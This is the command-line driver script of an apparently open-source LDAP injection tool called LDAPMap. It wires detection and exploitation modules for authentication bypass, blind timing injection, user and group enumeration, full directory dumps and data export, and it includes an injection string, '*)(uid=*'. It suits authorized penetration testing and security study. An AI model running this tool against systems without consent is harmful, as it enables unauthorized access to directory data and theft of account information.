
import sys
import os
import argparse
from typing import Optional, List, Dict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ldapmap_attacker import __version__
from ldapmap_attacker.lib.logger import setup_logger
from ldapmap_attacker.lib.utils import is_valid_url
from ldapmap_attacker.core.session import Session
from ldapmap_attacker.core.engine import Engine


def banner():
    from datetime import datetime
    print(fr"""
    _    _                            
   | |__| |__ _ _ __ _ __  __ _ _ __ 
   | / _` / _` | '_ \ '  \/ _` | '_ \
   |_\__,_\__,_| .__/_|_|_\__,_| .__/
               |_|             |_|   ldapmap v{__version__} ( https://github.com/ldapmap/ldapmap )
    """)
    print("    [!] Legal Disclaimer: Usage of LDAPMap for attacking targets without prior mutual consent")
    print("        is illegal. It is the end user's responsibility to obey all applicable local, state,")
    print("        and federal laws. Developers assume no liability and are not responsible for misuse.")
    print(f"\n    ldapmap started @ {datetime.now().strftime('%H:%M:%S')}\n")


def create_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ldapmap",
        description="""
LDAPMap - LDAP injection detection and exploitation tool.

Usage examples:
  python ldapmap.py -u "http://target/search?cn=INPUT"
  python ldapmap.py -u "http://target/login" --data="username=admin&password=INPUT"
  python ldapmap.py -u "http://target/search?cn=INPUT" -d error_based boolean_based -v
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Placeholders: Use INPUT in the URL or data to indicate the injection point.
        """
    )
    
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL with INPUT placeholder (ex: http://target/search?cn=INPUT)"
    )
    parser.add_argument(
        "-m", "--method",
        default="GET",
        choices=["GET", "POST", "PUT", "DELETE"],
        help="HTTP method (default: GET)"
    )
    parser.add_argument(
        "--data",
        help="POST data (ex: username=admin&password=INPUT)"
    )
    
    parser.add_argument(
        "-d", "--detector",
        nargs="+",
        default=["error_based", "boolean_based"],
        choices=["error_based", "boolean_based", "time_based"],
        help="Detectors to use (default: error_based boolean_based)"
    )
    parser.add_argument(
        "-p", "--payload",
        nargs="+",
        default=["authentication_bypass", "data_extraction"],
        choices=["authentication_bypass", "data_extraction", "blind"],
        help="Payload types to use (default: authentication_bypass data_extraction)"
    )
    
    parser.add_argument(
        "--threads", "-T",
        type=int,
        default=5,
        help="Number of threads (default: 5)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0,
        help="Delay between requests in seconds (default: 0)"
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=3,
        help="Number of retries (default: 3)"
    )
    
    parser.add_argument(
        "-H", "--header",
        nargs="+",
        help="HTTP headers (ex: 'Authorization: Bearer token')"
    )
    parser.add_argument(
        "--cookie",
        help="Cookies (ex: sessionid=abc123; auth=xyz)"
    )
    parser.add_argument(
        "--proxy",
        help="Proxy HTTP (ex: http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--no-verify-ssl",
        action="store_true",
        help="Disable SSL verification"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose mode"
    )
    parser.add_argument(
        "--no-banner",
        action="store_true",
        help="Hide banner"
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {__version__}",
        help="Show version"
    )

    exploitation = parser.add_argument_group("Exploitation")
    exploitation.add_argument(
        "--exploit",
        action="store_true",
        help="Enable exploitation mode after detection"
    )
    exploitation.add_argument(
        "--enum-users",
        action="store_true",
        help="Enumerate LDAP users"
    )
    exploitation.add_argument(
        "--dump",
        action="store_true",
        help="Full LDAP database dump"
    )
    exploitation.add_argument(
        "--export",
        choices=["json", "csv", "xml", "all"],
        help="Export format for extracted data"
    )
    exploitation.add_argument(
        "--output",
        default="./output",
        help="Output directory for exports (default: ./output)"
    )

    advanced = parser.add_argument_group("Advanced Features")
    advanced.add_argument(
        "--scan-network",
        metavar="NETWORK",
        help="Scan network for LDAP apps (ex: 192.168.1.0/24)"
    )
    advanced.add_argument(
        "--brute-attrs",
        action="store_true",
        help="Brute-force hidden attributes"
    )
    advanced.add_argument(
        "--detect-server",
        action="store_true",
        help="Auto-detect LDAP server type"
    )
    advanced.add_argument(
        "--groups",
        action="store_true",
        help="Enumerate groups and memberships"
    )
    advanced.add_argument(
        "--fuzz",
        action="store_true",
        help="Fuzz payloads for custom injection"
    )
    advanced.add_argument(
        "--blind",
        action="store_true",
        help="Enable blind injection mode (timing attacks)"
    )
    advanced.add_argument(
        "--wordlist",
        metavar="FILE",
        help="Custom wordlist for fuzzing/brute-force"
    )

    return parser


def parse_headers(header_list):
    headers = {}
    if not header_list:
        return headers
    for header in header_list:
        if ":" in header:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()
    return headers


def parse_cookies(cookie_string):
    cookies = {}
    if not cookie_string:
        return cookies
    for cookie in cookie_string.split(";"):
        if "=" in cookie:
            key, value = cookie.split("=", 1)
            cookies[key.strip()] = value.strip()
    return cookies


def main():
    parser = create_parser()
    args = parser.parse_args()
    
    log_level = "DEBUG" if args.verbose else "INFO"
    logger = setup_logger(level=log_level)
    
    if not args.no_banner:
        banner()

    if not is_valid_url(args.url):
        logger.error(f"Invalid URL: {args.url}")
        sys.exit(1)

    logger.info(f"Target: {args.url}")
    logger.info(f"Method: {args.method}")
    if args.data:
        logger.info(f"POST Data: {args.data}")
    
    headers = parse_headers(args.header)
    cookies = parse_cookies(args.cookie)
    
    session = Session(
        target_url=args.url,
        method=args.method,
        post_data=args.data,
        injection_point=None,
        timeout=args.timeout,
        retries=args.retries,
        threads=args.threads,
        delay=args.delay,
        proxy=args.proxy,
        headers=headers,
        cookies=cookies,
        verify_ssl=not args.no_verify_ssl,
        detectors=args.detector,
        payloads=args.payload,
    )
    
    try:
        if args.scan_network:
            from ldapmap_attacker.core.scanner import LDAPApplicationScanner
            logger.info(f"Scanning LDAP application surfaces in {args.scan_network}")
            hunter = LDAPApplicationScanner(workers=args.threads)
            hits = hunter.hunt_network(args.scan_network)
            if hits:
                logger.success(f"Found {len(hits)} potentially vulnerable hosts")
                for host in hits:
                    print(f"  - {host['host']}:{host['port']} -> {host['url']}")
            sys.exit(0)

        engine = Engine(session)
        engine.setup()
        engine.run()

        if args.exploit or args.enum_users or args.dump or args.groups or args.brute_attrs or args.detect_server or args.fuzz or args.blind:
            if engine.has_vulnerabilities() or args.blind:
                logger.success("Starting advanced exploitation...")
                exploiter = engine.get_exploiter()

                if args.detect_server:
                    from ldapmap_attacker.core.server_detector import LDAPServerProfiler
                    profiler = LDAPServerProfiler(exploiter)
                    report = profiler.fingerprint()
                    logger.success(f"Server: {report['type']} {report['ver']}")
                    features = [name for name, enabled in report["caps"].items() if enabled]
                    print("  Features: " + ", ".join(features))

                if args.blind:
                    from ldapmap_attacker.core.blind_injection import BlindAttributeEnumerator
                    blind = BlindAttributeEnumerator(exploiter)
                    blind.calibrate_timing("*)(uid=*", "uid=nonexistent")
                    result = blind.recover_attribute_value("uid")
                    logger.success(f"Blind extraction recovered: {result}")

                if args.brute_attrs:
                    from ldapmap_attacker.core.attribute_bruteforce import DirectoryAttributeProfiler
                    profiler = DirectoryAttributeProfiler(exploiter)
                    attrs = profiler.survey_standard_attributes()
                    profiler.survey_sensitive_attributes()
                    profiler.build_report()
                    logger.success(f"Attribute profiling discovered {len(attrs)} visible attributes")

                if args.groups:
                    from ldapmap_attacker.core.group_exploiter import DirectoryGroupAuditor
                    auditor = DirectoryGroupAuditor(exploiter)
                    groups = auditor.enumerate_groups()
                    privileged_accounts = auditor.identify_privileged_accounts()
                    logger.success(
                        f"Found {len(groups)} groups and {len(privileged_accounts)} privileged memberships"
                    )

                if args.fuzz:
                    from ldapmap_attacker.core.payload_fuzzer import LDAPPayloadCatalog
                    catalog = LDAPPayloadCatalog(exploiter)
                    strings = catalog.make_strings()
                    results = catalog.test_strings(strings[:20])
                    logger.success(f"Payload catalog identified {len(results)} effective probe strings")

                users = []
                if args.enum_users or args.dump:
                    users = engine.exploit(
                        enum_users=args.enum_users,
                        dump=args.dump,
                        export_format=args.export,
                        output_dir=args.output
                    )

                if args.export and users:
                    from ldapmap_attacker.core.exporter import DataExporter
                    writer = DataExporter(args.output)
                    if args.export == "json":
                        path = writer.export_json(users)
                    elif args.export == "csv":
                        path = writer.export_csv(users)
                    elif args.export == "xml":
                        path = writer.export_xml(users)
                    elif args.export == "all":
                        paths = writer.export_all(users)
                        path = f"{paths['json']}, {paths['csv']}, {paths['xml']}"
                    logger.success(f"Exported to: {path}")
            else:
                logger.warning("No vulnerabilities found - exploitation skipped")

    except KeyboardInterrupt:
        logger.warning("Attack interrupted by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        if 'engine' in locals():
            engine.cleanup()


if __name__ == "__main__":
    main()
